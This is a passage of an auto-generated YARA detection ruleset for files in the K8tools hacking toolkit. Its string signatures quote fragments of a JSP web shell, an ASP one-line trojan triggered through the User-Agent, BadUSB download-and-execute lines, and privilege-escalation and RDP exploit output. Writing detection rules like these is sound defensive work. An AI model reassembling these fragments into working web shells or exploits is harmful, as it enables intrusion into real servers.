      $s10 = "ascii_println(\"echo objXMLHTTP.send() >> K8.vbs\");" fullword ascii /* score: '14.01'*/
      $s11 = "ascii_println(\"echo objADOStream.Write objXMLHTTP.ResponseBody >> K8.vbs\");" fullword ascii /* score: '14.01'*/
      $s12 = "ascii_println(\"echo Set objXMLHTTP = CreateObject(\\\"MSXML2.XMLHTTP\\\") >> K8.vbs\");" fullword ascii /* score: '14.01'*/
      $s13 = "ascii_println(\"echo Set objXMLHTTP = Nothing >> K8.vbs\");" fullword ascii /* score: '14.01'*/
      $s14 = "ascii_println(\"echo If objXMLHTTP.Status = 200 Then >> K8.vbs\");" fullword ascii /* score: '14.00'*/
      $s15 = "Keyboard.println(\"chmod +x xxoo.out\");" fullword ascii /* score: '13.17'*/
      $s16 = "Keyboard.println(\"rm xxoo.out\");" fullword ascii /* score: '13.17'*/
      $s17 = "Keyboard.println(\"./xxoo.out &\");" fullword ascii /* score: '13.00'*/
      $s18 = "ascii_type_this(SomeCommand);" fullword ascii /* score: '12.00'*/
      $s19 = "//win downexec" fullword ascii /* score: '12.00'*/
      $s20 = "//linux downexec" fullword ascii /* score: '12.00'*/
   condition:
      uint16(0) == 0x2f2f and filesize < 20KB and
      1 of ($x*) and 4 of them
}

rule Magento_1_7_0_2_______EXP_20150624_K_8_ {
   meta:
      description = "K8tools - file Magento 1.7.0.2 漏洞EXP_20150624[K.8].rar"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "8762e55e216c45eafa92793e96ae622c429c2baeff73f0d457cf981d2218d389"
   strings:
      $s1 = "0day-Exp\\exp1.exe" fullword ascii /* score: '12.42'*/
      $s2 = "0day-Exp\\exp2.exe" fullword ascii /* score: '12.42'*/
      $s3 = "0day-Exp\\exp.exe" fullword ascii /* score: '12.42'*/
      $s4 = "pKBp9-@N" fullword ascii /* score: '4.00'*/
      $s5 = "nNzkrpj" fullword ascii /* score: '4.00'*/
      $s6 = "JXUxdws" fullword ascii /* score: '4.00'*/
      $s7 = "XPDc^;k" fullword ascii /* score: '4.00'*/
      $s8 = "TgCCJ.SO" fullword ascii /* score: '4.00'*/
      $s9 = "\\`4H!w" fullword ascii /* score: '2.00'*/
      $s10 = "Z0u+u{\"uYR" fullword ascii /* score: '1.42'*/
      $s11 = "7wr]96_a=V[k" fullword ascii /* score: '1.00'*/
      $s12 = "em<( 9" fullword ascii /* score: '1.00'*/
      $s13 = "[ R=7f" fullword ascii /* score: '1.00'*/
      $s14 = "\"Jz$6V!\"q" fullword ascii /* score: '1.00'*/
      $s15 = "@t+I5u[t" fullword ascii /* score: '1.00'*/
      $s16 = "ys-[wIi[" fullword ascii /* score: '1.00'*/
      $s17 = "i{z/*?" fullword ascii /* score: '1.00'*/
      $s18 = "Y24L\\'1" fullword ascii /* score: '1.00'*/
      $s19 = "wqA~%t" fullword ascii /* score: '1.00'*/
      $s20 = "Or>}]i" fullword ascii /* score: '1.00'*/
   condition:
      uint16(0) == 0x6152 and filesize < 90KB and
      8 of them
}

rule cve_2019_0708_poc {
   meta:
      description = "K8tools - file cve-2019-0708-poc.py"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "eb33fb1f49cfd580b8b19c703d949e7835e13b04065613134d880217d2a7bba7"
   strings:
      $s1 = "print(\"Usage: python poc.py 127.0.0.1 64\")" fullword ascii /* score: '14.00'*/
      $s2 = "# I've had to send the packets 5 times for hosts that havent" fullword ascii /* score: '13.00'*/
      $s3 = "# had a terminal session since their last reboot. I think" fullword ascii /* score: '11.00'*/
      $s4 = "# Could clean these up since I don't even use them" fullword ascii /* score: '10.00'*/
      $s5 = "tpkt['TPDU'] = tpdu.getData()" fullword ascii /* score: '9.17'*/
      $s6 = "tpdu['VariablePart'] = rdp_neg.getData()" fullword ascii /* score: '9.17'*/
      $s7 = "s.connect((host, 3389))" fullword ascii /* score: '9.00'*/
      $s8 = "s.sendall(tpkt.getData())" fullword ascii /* score: '9.00'*/
      $s9 = "def send_init_packets(host):" fullword ascii /* score: '9.00'*/
      $s10 = "# the first time though." fullword ascii /* score: '8.00'*/
      $s11 = "# I know why but atm its just easier to send the exchange" fullword ascii /* score: '8.00'*/
      $s12 = "# 5 times and it'll crash eventually. Most of the time its" fullword ascii /* score: '8.00'*/
      $s13 = "from impacket.structure import Structure" fullword ascii /* score: '7.00'*/
      $s14 = "tls.sendall(p7)" fullword ascii /* score: '7.00'*/
      $s15 = "tls = SSL.Connection(ctx,s)" fullword ascii /* score: '7.00'*/
      $s16 = "tls.sendall(p4)" fullword ascii /* score: '7.00'*/
      $s17 = "tls.sendall(p)" fullword ascii /* score: '7.00'*/
      $s18 = "tls.recv(8192)" fullword ascii /* score: '7.00'*/
      $s19 = "tls.sendall(p5)" fullword ascii /* score: '7.00'*/
      $s20 = "tls.sendall(p2)" fullword ascii /* score: '7.00'*/
   condition:
      uint16(0) == 0x6d69 and filesize < 50KB and
      8 of them
}

rule Hacking_Team_flash0day_20150707_K8_ {
   meta:
      description = "K8tools - file Hacking Team flash0day_20150707[K8].rar"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "4f35c8a07dbb2d23a8f4cde88390f5b97c9a0d46cdb604141a06383f4dc80b1e"
   strings:
      $s1 = "flash0day\\readme.txt" fullword ascii /* score: '14.00'*/
      $s2 = "flash0day\\Firefox.PNG" fullword ascii /* score: '7.42'*/
      $s3 = "flash0day\\flash0day.rar" fullword ascii /* score: '7.42'*/
      $s4 = "flash0day\\IE10.PNG" fullword ascii /* score: '7.42'*/
      $s5 = "K -@Cm" fullword ascii /* score: '5.00'*/
      $s6 = "<o{ -e" fullword ascii /* score: '5.00'*/
      $s7 = "lefean" fullword ascii /* score: '5.00'*/
      $s8 = "jVqp@|\\5Zm" fullword ascii /* score: '4.42'*/
      $s9 = "l ;UrZN!" fullword ascii /* score: '4.00'*/
      $s10 = "yOuMYOss\"(" fullword ascii /* score: '4.00'*/
      $s11 = "ZIBdd<." fullword ascii /* score: '4.00'*/
      $s12 = "tEGWRMaDv'" fullword ascii /* score: '4.00'*/
      $s13 = "JAvS\"\"" fullword ascii /* score: '4.00'*/
      $s14 = "akyC ![," fullword ascii /* score: '4.00'*/
      $s15 = "btdU:2E" fullword ascii /* score: '4.00'*/
      $s16 = "UjBPz-4" fullword ascii /* score: '4.00'*/
      $s17 = "pQPNwlU.L" fullword ascii /* score: '4.00'*/
      $s18 = "DiKw!e" fullword ascii /* score: '4.00'*/
      $s19 = "_PjTj\"@" fullword ascii /* score: '4.00'*/
      $s20 = "QcYYy.H" fullword ascii /* score: '4.00'*/
   condition:
      uint16(0) == 0x6152 and filesize < 2000KB and
      8 of them
}

rule CVE_2019_0803 {
   meta:
      description = "K8tools - file CVE-2019-0803.exe"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "b65665f49736dba597b8acf9a3191de6e76ea11aee9d08c1a0f86172c62adb88"
   strings:
      $x1 = "C:\\Users\\K8team\\Desktop\\CVE-2019-0803\\win7sp1\\x64\\Debug\\poc_test.pdb" fullword ascii /* score: '37.00'*/
      $s2 = "Cmd.exe /c " fullword ascii /* score: '29.42'*/
      $s3 = "target process found!" fullword ascii /* score: '25.00'*/
      $s4 = "[*]Searching for current processes EPROCESS structure" fullword ascii /* score: '15.00'*/
      $s5 = "Next eprocess address: 0x%llx" fullword ascii /* score: '15.00'*/
      $s6 = "[*]Searching for SYSTEM security token address" fullword ascii /* score: '13.00'*/
      $s7 = "minkernel\\crts\\ucrt\\src\\appcrt\\heap\\align.cpp" fullword wide /* score: '12.00'*/
      $s8 = "minkernel\\crts\\ucrt\\src\\appcrt\\lowio\\close.cpp" fullword wide /* score: '12.00'*/
      $s9 = "minkernel\\crts\\ucrt\\src\\appcrt\\heap\\new_handler.cpp" fullword wide /* score: '12.00'*/
      $s10 = "f:\\program files\\microsoft visual studio 14.0\\vc\\include\\xmemory0" fullword wide /* score: '10.00'*/
      $s11 = "f:\\program files\\microsoft visual studio 14.0\\vc\\include\\ostream" fullword wide /* score: '10.00'*/
      $s12 = "f:\\program files\\microsoft visual studio 14.0\\vc\\include\\xstring" fullword wide /* score: '10.00'*/
      $s13 = "f:\\program files\\microsoft visual studio 14.0\\vc\\atlmfc\\include\\atlconv.h" fullword wide /* score: '10.00'*/
      $s14 = "EXP - CVE-2019-0803" fullword ascii /* score: '9.00'*/
      $s15 = "f:\\program files\\microsoft visual studio 14.0\\vc\\include\\xlocale" fullword wide /* score: '9.00'*/
      $s16 = "[!]xxTriggerExploitEx Success " fullword ascii /* score: '8.00'*/
      $s17 = "ptiaddress == %llx" fullword ascii /* score: '7.07'*/
      $s18 = "tagTHREAD == %llx" fullword ascii /* score: '7.07'*/
      $s19 = "[+]trying %d times " fullword ascii /* score: '7.00'*/
      $s20 = "\"_Count <= (size_t)(-1) / sizeof (_Ty)\" && 0" fullword wide /* score: '7.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 5000KB and
      ( pe.imphash() == "d6303949cc1f48f4f6e2bda95744a896" or ( 1 of ($x*) or 4 of them ) )
}

rule pre_rebase {
   meta:
      description = "K8tools - file pre-rebase.sample"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "4febce867790052338076f4e66cc47efb14879d18097d1d61c8261859eaaa7b3"
   strings:
      $s1 = "my $msg = \"* $topic has commits already merged to public branch:\\n\";" fullword ascii /* score: '23.00'*/
      $s2 = "# $1 -- the upstream the series was forked from." fullword ascii /* score: '16.00'*/
      $s3 = "# $2 -- the branch being rebased (or empty when rebasing the current branch)." fullword ascii /* score: '16.00'*/
      $s4 = "/usr/bin/perl -e '" fullword ascii /* score: '15.00'*/
      $s5 = "build on top of it -- other people may already want to" fullword ascii /* score: '15.00'*/
      $s6 = "# its job, and can prevent the command from running by exiting with" fullword ascii /* score: '15.00'*/
      $s7 = "git show-ref -q \"$topic\" || {" fullword ascii /* score: '12.00'*/
      $s8 = "if test -z \"$not_in_topic\"" fullword ascii /* score: '12.00'*/
      $s9 = "if test -z \"$not_in_master\"" fullword ascii /* score: '12.00'*/
      $s10 = "* Once a topic branch is fully cooked and merged into \"master\"," fullword ascii /* score: '12.00'*/
      $s11 = "* A has one fix since it was merged up to \"next\"." fullword ascii /* score: '12.00'*/
      $s12 = "* C has not merged to \"next\" at all." fullword ascii /* score: '12.00'*/
      $s13 = "* Whenever you need to test or publish your changes to topic" fullword ascii /* score: '12.00'*/
      $s14 = "* Once a topic branch forks from \"master\", \"master\" is never" fullword ascii /* score: '12.00'*/
      $s15 = "* B has finished.  It has been fully merged up to \"master\" and \"next\"," fullword ascii /* score: '12.00'*/
      $s16 = "# would result in rebasing already published history." fullword ascii /* score: '11.00'*/
      $s17 = "# This sample shows how to prevent topic branches that are already" fullword ascii /* score: '11.00'*/
      $s18 = "# The \"pre-rebase\" hook is run just before \"git rebase\" starts doing" fullword ascii /* score: '11.00'*/
      $s19 = "# Copyright (c) 2006, 2008 Junio C Hamano" fullword ascii /* score: '10.00'*/
      $s20 = "The script, being an example, hardcodes the publish branch name" fullword ascii /* score: '10.00'*/
   condition:
      uint16(0) == 0x2123 and filesize < 10KB and
      8 of them
}

rule K8__________________V1_1_20121020_K_8_ {
   meta:
      description = "K8tools - file K8手机远控电脑V1.1_20121020[K.8].rar"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "d7a9681b2c65fa3bab3497915149d39fc354d3d86873725370f6f40c88971e72"
   strings:
      $s1 = "nnnnnnni" fullword ascii /* reversed goodware string 'innnnnnn' */ /* score: '18.00'*/
      $s2 = "V1.1\\kill.bat" fullword ascii /* score: '11.00'*/
      $s3 = "o\\~]bHlZFd:\"" fullword ascii /* score: '10.00'*/
      $s4 = "]\"{>2a\\" fullword ascii /* score: '9.00'*/ /* hex encoded string '*' */
      $s5 = "sxqragd" fullword ascii /* score: '8.00'*/
      $s6 = "nnnnnnk" fullword ascii /* score: '8.00'*/
      $s7 = "V1.1\\k8cmd.asp" fullword ascii /* score: '7.00'*/
      $s8 = "V1.1\\K8mobliePC.png" fullword ascii /* score: '7.00'*/
      $s9 = "N:\\MJ9gL" fullword ascii /* score: '7.00'*/
      $s10 = "M1-->ud@" fullword ascii /* score: '6.00'*/
      $s11 = "\"SDM]+ " fullword ascii /* score: '5.42'*/
      $s12 = "z)Xq- " fullword ascii /* score: '5.42'*/
      $s13 = "- P2|\\" fullword ascii /* score: '5.00'*/
      $s14 = "'j:* %" fullword ascii /* score: '5.00'*/
      $s15 = "IA * D S" fullword ascii /* score: '5.00'*/
      $s16 = "sW| /x!" fullword ascii /* score: '5.00'*/
      $s17 = "xjtjYY2" fullword ascii /* score: '5.00'*/
      $s18 = "kkllnn" fullword ascii /* score: '5.00'*/
      $s19 = "#I* AQ!Y" fullword ascii /* score: '5.00'*/
      $s20 = "Ny- E3" fullword ascii /* score: '5.00'*/
   condition:
      uint16(0) == 0x6152 and filesize < 3000KB and
      8 of them
}

rule K8_FTP______PHP______20151010 {
   meta:
      description = "K8tools - file K8_FTP爆破PHP脚本20151010.rar"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "165835186a608df41a209b380d0112e0ddd99d881c9cf77de42995126b275fec"
   strings:
      $s1 = "ckftp\\user.txt" fullword ascii /* score: '19.00'*/
      $s2 = "ckftp\\pwd.txt" fullword ascii /* score: '16.00'*/
      $s3 = "ckftp\\ip.txt" fullword ascii /* score: '16.00'*/
      $s4 = "ckftp\\ck.php" fullword ascii /* score: '12.42'*/
      $s5 = "anonymous" fullword ascii /* PEStudio Blacklist: strings */ /* score: '4.88'*/ /* Goodware String - occured 115 times */
      $s6 = "PIw*6E" fullword ascii /* score: '1.00'*/
      $s7 = "knk,8(" fullword ascii /* score: '1.00'*/
      $s8 = "3588i7|" fullword ascii /* score: '1.00'*/
   condition:
      uint16(0) == 0x6152 and filesize < 2KB and
      all of them
}

rule k8_zabbix_exp_20160820_K_8_ {
   meta:
      description = "K8tools - file k8_zabbix_exp_20160820[K.8].rar"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "80fb83cd72c4b5d03c70638f9d7225cf94458c3b1dcf13c06f80c7f5082e3f92"
   strings:
      $s1 = "k8_zabbix_exp.exe7b" fullword ascii /* score: '8.00'*/
      $s2 = "YQQAI0" fullword ascii /* score: '2.00'*/
      $s3 = "?s7'pE" fullword ascii /* score: '1.00'*/
      $s4 = ",L6OKs?" fullword ascii /* score: '1.00'*/
      $s5 = "|VD(fE" fullword ascii /* score: '1.00'*/
      $s6 = ".`R:?%r" fullword ascii /* score: '1.00'*/
      $s7 = "tj,U^*-" fullword ascii /* score: '1.00'*/
      $s8 = "3FkM^+" fullword ascii /* score: '1.00'*/
      $s9 = "ak4t_~" fullword ascii /* score: '1.00'*/
      $s10 = "w}2z=Y'lZ" fullword ascii /* score: '1.00'*/
      $s11 = "K.\\6Z<" fullword ascii /* score: '1.00'*/
      $s12 = "<rTqXn" fullword ascii /* score: '1.00'*/
      $s13 = "(t*{@Wp" fullword ascii /* score: '1.00'*/
   condition:
      uint16(0) == 0x6152 and filesize < 30KB and
      8 of them
}

rule prepare_commit_msg {
   meta:
      description = "K8tools - file prepare-commit-msg.sample"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "e9ddcaa4189fddd25ed97fc8c789eca7b6ca16390b2392ae3276f0c8e1aa4619"
   strings:
      $s1 = "# An example hook script to prepare the commit log message." fullword ascii /* score: '22.00'*/
      $s2 = "# SOB=$(git var GIT_COMMITTER_IDENT | sed -n 's/^\\(.*>\\).*$/Signed-off-by: \\1/p')" fullword ascii /* score: '19.00'*/
      $s3 = "# if test -z \"$COMMIT_SOURCE\"" fullword ascii /* score: '19.00'*/
      $s4 = "# commit message, followed by the description of the commit" fullword ascii /* score: '17.00'*/
      $s5 = "# git interpret-trailers --in-place --trailer \"$SOB\" \"$COMMIT_MSG_FILE\"" fullword ascii /* score: '15.00'*/
      $s6 = "#  ,|template,)" fullword ascii /* score: '15.00'*/
      $s7 = "if /^#/ && $first++ == 0' \"$COMMIT_MSG_FILE\" ;;" fullword ascii /* score: '14.00'*/
      $s8 = "#    /usr/bin/perl -i.bak -pe '" fullword ascii /* score: '13.00'*/
      $s9 = "#   /usr/bin/perl -i.bak -pe 'print \"\\n\" if !$first_line++' \"$COMMIT_MSG_FILE\"" fullword ascii /* score: '13.00'*/
      $s10 = "# The second includes the output of \"git diff --name-status -r\"" fullword ascii /* score: '12.00'*/
      $s11 = "# commits." fullword ascii /* score: '11.00'*/
      $s12 = "# the commit is aborted." fullword ascii /* score: '11.00'*/
      $s13 = "# message's source.  The hook's purpose is to edit the commit" fullword ascii /* score: '11.00'*/
      $s14 = "# commented because it doesn't cope with --amend or with squashed" fullword ascii /* score: '11.00'*/
      $s15 = "# message file.  If the hook fails with a non-zero status," fullword ascii /* score: '11.00'*/
      $s16 = "# To enable this hook, rename this file to \"prepare-commit-msg\"." fullword ascii /* score: '11.00'*/
      $s17 = "/usr/bin/perl -i.bak -ne 'print unless(m/^. Please enter the commit message/..m/^#$/)' \"$COMMIT_MSG_FILE\"" fullword ascii /* score: '9.00'*/
      $s18 = "# This hook includes three examples. The first one removes the" fullword ascii /* score: '8.00'*/
      $s19 = "# still be edited.  This is rarely a good idea." fullword ascii /* score: '8.00'*/
      $s20 = "# into the message, just before the \"git status\" output.  It is" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x2123 and filesize < 4KB and
      8 of them
}

rule K8domainVBS {
   meta:
      description = "K8tools - file K8domainVBS.exe"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "258525c2e1679c80d1e357bb2628a43f0549b8af553a65006300fec6c0c456ea"
   strings:
      $s1 = "K8domainVBS.exe" fullword wide /* score: '22.00'*/
      $s2 = "constructor or from DllMain." fullword ascii /* score: '9.00'*/
      $s3 = "LV[W!." fullword ascii /* score: '5.00'*/
      $s4 = "B|BxBtBpBlBhBdB`B\\BXBTBPBLBHBDB@B<B8B4B0B,B(B$B B" fullword wide /* score: '4.00'*/
      $s5 = "YnqL-s3" fullword ascii /* score: '4.00'*/
      $s6 = "K8domainVBS" fullword wide /* score: '4.00'*/
      $s7 = "L$|Qh0" fullword ascii /* score: '4.00'*/ /* Goodware String - occured 1 times */
      $s8 = "L.Lxu?" fullword ascii /* score: '4.00'*/
      $s9 = "DIDY:P<" fullword ascii /* score: '4.00'*/
      $s10 = "RSDS%?t" fullword ascii /* score: '4.00'*/
      $s11 = "T$h9T$" fullword ascii /* score: '4.00'*/ /* Goodware String - occured 1 times */
      $s12 = "ForceRemove" fullword ascii /* PEStudio Blacklist: strings */ /* score: '3.83'*/ /* Goodware String - occured 1167 times */
      $s13 = "NoRemove" fullword ascii /* PEStudio Blacklist: strings */ /* score: '3.83'*/ /* Goodware String - occured 1170 times */
      $s14 = "FL9~Xu" fullword ascii /* score: '3.00'*/ /* Goodware String - occured 2 times */
      $s15 = "This indicates a bug in your application. It is most likely the result of calling an MSIL-compiled (/clr) function from a native" ascii /* score: '3.00'*/
      $s16 = "t.9Vlt)" fullword ascii /* score: '3.00'*/ /* Goodware String - occured 2 times */
      $s17 = "L$4;D$Ts<)D$T" fullword ascii /* score: '2.00'*/ /* Goodware String - occured 3 times */
      $s18 = "\\@IaOH/_" fullword ascii /* score: '2.00'*/
      $s19 = ";l$TsY)l$T" fullword ascii /* score: '2.00'*/ /* Goodware String - occured 3 times */
      $s20 = "245<@  $KR" fullword ascii /* score: '1.42'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 600KB and
      ( pe.imphash() == "9dd8c0ff4fc84287e5b766563240f983" or 8 of them )
}

rule k8______CMD {
   meta:
      description = "K8tools - file k8飞刀CMD.jsp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "7b2205565e6f08e59fc4750b0a4b26500d2720a2bcefa64b8f37fec423774843"
   strings:
      $x1 = "Process child = Runtime.getRuntime().exec(k8cmd);" fullword ascii /* score: '32.00'*/
      $s2 = "String cmd = request.getParameter(\"tom\");" fullword ascii /* score: '14.00'*/
      $s3 = "System.err.println(e);" fullword ascii /* score: '13.00'*/
      $s4 = "while ((c = in.read()) != -1) {" fullword ascii /* score: '11.00'*/
      $s5 = "if(cmd.equals(\"Szh0ZWFt\")){out.print(\"[S]\"+dir+\"[E]\");}" fullword ascii /* score: '9.01'*/
      $s6 = "InputStream in = child.getInputStream();" fullword ascii /* score: '9.00'*/
      $s7 = "String dir=new File(path).getParent();" fullword ascii /* score: '9.00'*/
      $s8 = "<%@page import=\"sun.misc.BASE64Decoder\"%>" fullword ascii /* score: '9.00'*/
      $s9 = "child.waitFor();" fullword ascii /* score: '7.00'*/
      $s10 = "out.print(\"->|\");" fullword ascii /* score: '7.00'*/
      $s11 = "out.print(\"|<-\");" fullword ascii /* score: '7.00'*/
      $s12 = "<%@page import=\"java.io.*\"%>" fullword ascii /* score: '7.00'*/
      $s13 = "String k8cmd = new String(binary);" fullword ascii /* score: '7.00'*/
      $s14 = "out.print((char)c);" fullword ascii /* score: '7.00'*/
      $s15 = "String path=application.getRealPath(request.getRequestURI());" fullword ascii /* score: '5.00'*/
      $s16 = "byte[] binary = BASE64Decoder.class.newInstance().decodeBuffer(cmd);" fullword ascii /* score: '5.00'*/
      $s17 = "in.close();" fullword ascii /* score: '4.00'*/
      $s18 = "e.printStackTrace();" fullword ascii /* score: '4.00'*/
      $s19 = "int c;" fullword ascii /* score: '4.00'*/ /* Goodware String - occured 1 times */
      $s20 = "} catch (InterruptedException e) {" fullword ascii /* score: '0.00'*/
   condition:
      uint16(0) == 0x253c and filesize < 2KB and
      1 of ($x*) and 4 of them
}

rule ms11_080 {
   meta:
      description = "K8tools - file ms11-080.exe"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "6a068efcfeb7c0e27c308913bd394ad29da3eccbd740c3fbabb7ead161e188b2"
   strings:
      $s1 = "[*] Token system command" fullword ascii /* score: '26.00'*/
      $s2 = "[*] command add user k8gege k8gege" fullword ascii /* score: '23.01'*/
      $s3 = "[*] User has been successfully added" fullword ascii /* score: '15.00'*/
      $s4 = "[>] ms11-08 Exploit" fullword ascii /* score: '8.00'*/
      $s5 = "[*] Add to Administrators success" fullword ascii /* score: '8.00'*/
      $s6 = "AAAABBBB" ascii /* score: '6.50'*/
      $s7 = "Administrators" fullword wide /* PEStudio Blacklist: strings */ /* score: '4.88'*/ /* Goodware String - occured 119 times */
      $s8 = "127.0.0.1" fullword ascii /* PEStudio Blacklist: strings */ /* score: '4.73'*/ /* Goodware String - occured 267 times */
      $s9 = "[>] by k8gege" fullword ascii /* score: '1.00'*/
      $s10 = "u`Whtp@" fullword ascii /* score: '1.00'*/
      $s11 = "k8gege" fullword wide /* score: '1.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 100KB and
      ( pe.imphash() == "f1038e72c8589e831cca550338ef31b2" or 8 of them )
}

rule bypassUAC_Win7_10_K8team_ {
   meta:
      description = "K8tools - file bypassUAC_Win7_10[K8team].rar"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "2a2d558d008b4a31bd872ae7078ff5322c8f3fc37821cbebc83adc65463d5611"
   strings:
      $x1 = "bypassUAC_Win7_10[K8team].exe" fullword ascii /* score: '30.00'*/
      $s2 = "** $DU" fullword ascii /* score: '9.00'*/
      $s3 = ".vwC* " fullword ascii /* score: '8.42'*/
      $s4 = "?lGJH- " fullword ascii /* score: '5.42'*/
      $s5 = "Jvp}!." fullword ascii /* score: '5.00'*/
      $s6 = "iTHqel6" fullword ascii /* score: '5.00'*/
      $s7 = "ataRWqx3" fullword ascii /* score: '5.00'*/
      $s8 = "c+ 'sn" fullword ascii /* score: '5.00'*/
      $s9 = "OiFfOO " fullword ascii /* score: '4.42'*/
      $s10 = "win7_uac.PNG" fullword ascii /* score: '4.00'*/
      $s11 = "win7_uac10.PNG" fullword ascii /* score: '4.00'*/
      $s12 = "ezMy(QJqx" fullword ascii /* score: '4.00'*/
      $s13 = "TUfWPN6d" fullword ascii /* score: '4.00'*/
      $s14 = "KFjCx\\" fullword ascii /* score: '4.00'*/
      $s15 = "fsnxrQg" fullword ascii /* score: '4.00'*/
      $s16 = "~tWWUTh4" fullword ascii /* score: '4.00'*/
      $s17 = "yUVU1\\9" fullword ascii /* score: '4.00'*/
      $s18 = "win10_uac.PNG" fullword ascii /* score: '4.00'*/
      $s19 = "sSdooIp=" fullword ascii /* score: '4.00'*/
      $s20 = "fRkXX6'" fullword ascii /* score: '4.00'*/
   condition:
      uint16(0) == 0x6152 and filesize < 2000KB and
      1 of ($x*) and 4 of them
}

rule ws2help_______K8 {
   meta:
      description = "K8tools - file ws2help提权_K8.rar"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "bf8cfd225f1321b26cf97ed5e4dd32f0094dc31275585f8f6f27d1ea471b6d70"
   strings:
      $s1 = "ws2help.dll " fullword ascii /* score: '19.42'*/
      $s2 = "k8team k8team" fullword ascii /* score: '4.00'*/
      $s3 = "ws2help.dll" fullword ascii /* score: '4.00'*/ /* Goodware String - occured 1 times */
      $s4 = "LPK UPS10 " fullword ascii /* score: '1.42'*/
      $s5 = "r `{-q" fullword ascii /* score: '1.00'*/
      $s6 = "~w]=7l" fullword ascii /* score: '1.00'*/
      $s7 = "2qBoIb" fullword ascii /* score: '1.00'*/
      $s8 = "\"*I-q`" fullword ascii /* score: '1.00'*/
      $s9 = ">jv~nZr_O$" fullword ascii /* score: '1.00'*/
      $s10 = "5^n$^J&f" fullword ascii /* score: '1.00'*/
      $s11 = "K4;R_}" fullword ascii /* score: '1.00'*/
      $s12 = "Lv4t+*" fullword ascii /* score: '1.00'*/
      $s13 = "<<5.}A" fullword ascii /* score: '1.00'*/
   condition:
      uint16(0) == 0x6152 and filesize < 30KB and
      8 of them
}

rule K8______A______UA_______________ {
   meta:
      description = "K8tools - file K8飞刀A专用UA一句话木马.asp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "c78d2210df810f6958c6abd1930b8e5b504e2b57e61c930896bbd43a74a9170b"
   strings:
      $x1 = "<%uastr=Request.ServerVariables(\"HTTP_USER_AGENT\"):pwd=\"tom\":StartStrPos = Instr(uastr, \"k0\")+Len(\"k0\")  :EndStrPos = In" ascii /* score: '33.00'*/
      $s2 = "r,\"===\"):Length = EndStrPos - StartStrPos:Res= Mid(uastr,StartStrPos,Length):if (pwd=Res) then:execute replace(uastr,\"k0\"+Re" ascii /* score: '22.00'*/
      $s3 = "<%uastr=Request.ServerVariables(\"HTTP_USER_AGENT\"):pwd=\"tom\":StartStrPos = Instr(uastr, \"k0\")+Len(\"k0\")  :EndStrPos = In" ascii /* score: '15.42'*/
      $s4 = "==\",\"\"):end if%>" fullword ascii /* score: '1.07'*/
   condition:
      uint16(0) == 0x253c and filesize < 1KB and
      1 of ($x*) and all of them
}

rule K8weblogic_2 {
   meta:
      description = "K8tools - file K8weblogic.jar"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "d1d96275c5e8c452e73ec5c91912a5cd7488e5df08e70e87e5b7df4e5e43b684"
   strings:
      $s1 = "demo/WebLogicPasswordDecryptor.class" fullword ascii /* score: '15.00'*/
      $s2 = "demo/WebLogicPasswordDecryptor.classPK" fullword ascii /* score: '15.00'*/
      $s3 = "org/eclipse/jdt/internal/jarinjarloader/PK" fullword ascii /* score: '13.00'*/
      $s4 = "org/eclipse/jdt/internal/jarinjarloader/RsrcURLConnection.classPK" fullword ascii /* score: '12.00'*/
      $s5 = "org/eclipse/jdt/internal/jarinjarloader/RsrcURLConnection.class" fullword ascii /* score: '12.00'*/
      $s6 = "AbsoluteLayout.jar" fullword ascii /* score: '10.00'*/
      $s7 = "E /c 8/[" fullword ascii /* score: '9.00'*/
      $s8 = "org/eclipse/jdt/internal/jarinjarloader/JarRsrcLoader$ManifestInfo.classPK" fullword ascii /* score: '9.00'*/
      $s9 = "org/eclipse/jdt/internal/jarinjarloader/RsrcURLStreamHandler.classPK" fullword ascii /* score: '9.00'*/
      $s10 = "org/eclipse/jdt/internal/jarinjarloader/RsrcURLStreamHandlerFactory.classPK" fullword ascii /* score: '9.00'*/
      $s11 = "org/eclipse/jdt/internal/jarinjarloader/JarRsrcLoader.classPK" fullword ascii /* score: '9.00'*/
      $s12 = "org/eclipse/jdt/internal/jarinjarloader/JIJConstants.classPK" fullword ascii /* score: '9.00'*/
      $s13 = "org/eclipse/jdt/internal/jarinjarloader/JIJConstants.class" fullword ascii /* score: '9.00'*/
      $s14 = "org/eclipse/jdt/internal/jarinjarloader/JarRsrcLoader.class" fullword ascii /* score: '9.00'*/
      $s15 = "org/eclipse/jdt/internal/jarinjarloader/RsrcURLStreamHandler.class" fullword ascii /* score: '9.00'*/
      $s16 = "org/eclipse/jdt/internal/jarinjarloader/RsrcURLStreamHandlerFactory.class" fullword ascii /* score: '9.00'*/
